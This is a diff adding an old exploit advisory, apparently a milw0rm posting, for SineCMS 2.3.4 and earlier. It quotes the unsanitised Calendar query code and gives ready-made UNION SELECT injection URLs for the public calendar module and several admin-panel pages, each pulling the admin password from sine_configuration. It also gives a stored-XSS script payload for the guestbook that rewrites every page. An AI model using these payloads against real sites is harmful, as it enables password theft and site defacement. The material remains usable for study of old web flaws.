@@ -1,0 +1,80 @@
+---------------------------------------------------------------
+ ____            __________         __             ____  __   
+/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
+ |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
+ |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
+ |___|___|  /\__|  /______  /\___  >__|            |___||__|  
+          \/\______|      \/     \/                         
+---------------------------------------------------------------
+
+Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org 
+
+---------------------------------------------------------------
+
+SineCMS <= 2.3.4 Calendar SQL Injection 'n something else..
+
+---------------------------------------------------------------
+
+#By KiNgOfThEwOrLd				
+
+---------------------------------------------------------------
+Notes:
+
+Only with magic_quotes_gpc -> Off
+---------------------------------------------------------------
+Corrupted file: 
+
+mods/Calendar/index.php
+---------------------------------------------------------------
+Corrupted code:
+
+[...]
+function Evento ($sine){
+	if (!isset($_GET[id]) OR $_GET[id]=="") {
+	header("Location: index.php");
+	}
+	$query = "SELECT * FROM ".$sine[db][prefisso_tab]."calendario WHERE id='$_GET
+[id]'";
+	if ($_GET[id]){
+		$result = mysql_query($query, $sine[db][db]);
+		$row = mysql_fetch_array($result);
+[...]
+---------------------------------------------------------------
+Exploit:
+
+http://[target]/[sinecms_path]/mods.php?
+mods=Calendar&action=info&id='+union+select+1,password,3,4,5,6,7,8,9
++from+sine_configuration/*
+---------------------------------------------------------------
+Something else..
+
+There are a lots of useless sql injection in the admin panel, like...
+
+http://[target]/[sinecms_path]/admin/mods_adm.php?
+mods=Guestbook&action=modifica&id='+union+select+1,2,3,4,password,
+6+from+sine_configuration/*
+
+http://[target]/[sinecms_path]/admin/mods_adm.php?
+mods=Calendar&mese=11'+union+select+1,password,3,4,5,6,7,8,9
++from+sine_configuration/*
+
+http://[target]/[sinecms_path]/admin/mods_adm.php?
+mods=Calendar&action=modify&id='+union+select+1,2,3,4,password,6,7,8,9
++from+sine_configuration/*
+
+http://[target]/[sinecms_path]/admin/mods_adm.php?
+mods=Calendar&anno='+union+select+1,password,3,4,5,6,7,8,9
++from+sine_configuration/*
+
+and much more..
+---------------------------------------------------------------
+There is also a permanent html injection in the guestbook, and i belive it can 
+be considered so dangerous, coz the "last comments" module it's included in all 
+the pages...then, an attacker can rewrite alle the pages posting a comment like
+
+<script>document.body.innerHTML="[Arbitrary_Code]";</script>
+
+in the "username" or "comment" field.
+---------------------------------------------------------------
+
+# milw0rm.com [2007-12-05]
